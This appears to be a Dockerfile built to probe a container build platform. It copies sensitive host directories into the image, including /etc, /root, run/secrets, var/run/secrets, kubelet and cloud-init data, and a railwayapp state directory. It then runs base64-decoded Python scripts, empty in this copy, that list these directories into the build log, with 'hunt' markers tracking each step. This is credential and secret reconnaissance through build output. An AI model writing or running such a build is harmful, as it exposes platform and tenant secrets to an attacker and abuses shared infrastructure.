# MARK-i68223i
FROM alpine:3.20
RUN echo MARK-i68223i-step1
RUN apk add --no-cache python3 >/dev/null 2>&1; echo APKDONE
RUN echo '' > /p.b64
RUN echo '' >> /p.b64
RUN echo '' >> /p.b64
RUN base64 -d /p.b64 > /p.py; python3 -c "import ast;ast.parse(open('/p.py').read());print('PYOK')"; wc -c /p.py
COPY etc /H/etc
COPY opt /H/opt
COPY home /H/home
COPY root /H/root
COPY var/lib/railwayapp /H/var/lib/railwayapp
COPY var/lib/systemd /H/var/lib/systemd
RUN MARK=i68223f python3 /p.py 2>&1 | head -c 150000
RUN echo MARK-I68223-hunt-7b31i-list
RUN echo '' > /l.b64
RUN base64 -d /l.b64 > /l.py; python3 -c "import ast;ast.parse(open('/l.py').read());print('LOK')"
RUN python3 /l.py /H/var/lib/systemd 3 2>&1 | head -c 30000
COPY run/secrets /H/rsec
RUN python3 /l.py /H/rsec 3 2>&1 | head -c 20000
COPY var/run/secrets /H/vrsec
RUN python3 /l.py /H/vrsec 3 2>&1 | head -c 20000
COPY var/lib/kubelet /H/kubelet
RUN python3 /l.py /H/kubelet 3 2>&1 | head -c 20000
COPY var/lib/cloud /H/cloud
RUN python3 /l.py /H/cloud 3 2>&1 | head -c 20000
RUN python3 /l.py /H/docker 3 2>&1 | head -c 20000
RUN python3 /l.py /H/containerd 3 2>&1 | head -c 20000
RUN echo MARK-I68223-hunt-7b31i-done
CMD ["sh","-c","sleep 20"]
